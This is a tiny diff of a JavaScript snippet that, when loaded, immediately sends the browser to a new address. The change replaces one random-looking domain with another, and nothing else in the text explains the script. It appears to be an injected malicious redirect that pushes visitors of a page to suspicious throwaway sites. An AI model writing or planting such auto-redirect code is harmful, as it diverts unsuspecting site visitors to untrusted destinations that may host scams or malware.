@@ -1,4 +1,5 @@
 (function() {
-    window['location'] = 'https://wridopssmen.click/';
+    window['location'] = 'https://ggsorktjnzsngjib.shop/';
 })();
+
 
